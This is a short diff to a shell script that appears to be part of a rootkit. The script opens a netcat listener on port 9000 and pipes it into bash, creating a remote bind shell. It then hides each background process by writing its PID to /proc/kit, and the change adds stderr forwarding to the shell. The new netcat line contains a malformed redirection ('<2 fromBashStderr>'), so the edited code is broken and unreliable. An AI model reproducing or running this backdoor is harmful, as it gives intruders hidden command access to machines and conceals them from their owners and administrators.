@@ -11,12 +11,13 @@ localPort=9000
 
 mkfifo fromBash
 mkfifo toBash
+mkfifo fromBashStderr
 
-nc -l -k "$localPort" < fromBash > toBash &
+nc -l -k "$localPort" < fromBash <2 fromBashStderr> toBash &
 backgroundPID=$!
 echo "hidePid $backgroundPID" > /proc/kit
 
-bash > fromBash < toBash & # uses named pipe
+bash > fromBash < toBash  2> fromBashStderr & # uses named pipe
 backgroundPID=$!
 echo "hidePid $backgroundPID" > /proc/kit
 
